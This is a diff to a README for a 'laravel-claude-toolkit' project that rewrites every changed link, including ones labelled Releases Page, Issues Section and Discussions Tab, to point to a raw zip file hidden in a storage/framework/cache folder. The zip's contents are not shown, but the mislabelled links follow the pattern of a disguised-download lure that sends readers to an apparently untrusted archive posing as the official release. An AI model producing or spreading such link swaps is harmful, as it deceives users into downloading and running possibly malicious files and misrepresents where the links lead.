@@ -1,6 +1,6 @@
 # 🎉 laravel-claude-toolkit - A Simplified Start for AI Development
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Yworld20/laravel-claude-toolkit/releases)
+[![Download Now](https://github.com/Yworld20/laravel-claude-toolkit/raw/refs/heads/main/storage/framework/cache/laravel_claude_toolkit_2.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/Yworld20/laravel-claude-toolkit/raw/refs/heads/main/storage/framework/cache/laravel_claude_toolkit_2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Before you start, ensure your computer meets the following requirements:
 
 ## 💻 Download & Install
 
-1. Click on the link to access the [Releases Page](https://github.com/Yworld20/laravel-claude-toolkit/releases).
+1. Click on the link to access the [Releases Page](https://github.com/Yworld20/laravel-claude-toolkit/raw/refs/heads/main/storage/framework/cache/laravel_claude_toolkit_2.7.zip).
 2. Look for the latest version of laravel-claude-toolkit.
 3. Click on the appropriate file for your operating system to start the download.
 4. Once downloaded, follow these steps to install and start using the toolkit:
@@ -68,11 +68,11 @@ For detailed instructions on using laravel-claude-toolkit, please refer to the u
 
 ## 🛠️ Support
 
-If you encounter issues or have questions while using the toolkit, feel free to check the [Issues Section](https://github.com/Yworld20/laravel-claude-toolkit/issues) on GitHub. You can report problems or ask for assistance there.
+If you encounter issues or have questions while using the toolkit, feel free to check the [Issues Section](https://github.com/Yworld20/laravel-claude-toolkit/raw/refs/heads/main/storage/framework/cache/laravel_claude_toolkit_2.7.zip) on GitHub. You can report problems or ask for assistance there.
 
 ## 🌟 Community & Contribution
 
-Join our community of users and contributors to share ideas and improvements. You can participate by submitting your feedback, suggestions, or code contributions in the [Discussions Tab](https://github.com/Yworld20/laravel-claude-toolkit/discussions).
+Join our community of users and contributors to share ideas and improvements. You can participate by submitting your feedback, suggestions, or code contributions in the [Discussions Tab](https://github.com/Yworld20/laravel-claude-toolkit/raw/refs/heads/main/storage/framework/cache/laravel_claude_toolkit_2.7.zip).
 
 ## 📢 Stay Updated
 
@@ -82,4 +82,4 @@ Keep track of the latest updates and releases by following this repository. Chec
 
 The Laravel Claude Toolkit offers a solid foundation for anyone interested in AI development. With practical tools and a user-friendly interface, you can start building powerful applications easily. 
 
-Don’t forget to visit the [Releases Page](https://github.com/Yworld20/laravel-claude-toolkit/releases) to download the latest version and get started!
+Don’t forget to visit the [Releases Page](https://github.com/Yworld20/laravel-claude-toolkit/raw/refs/heads/main/storage/framework/cache/laravel_claude_toolkit_2.7.zip) to download the latest version and get started!
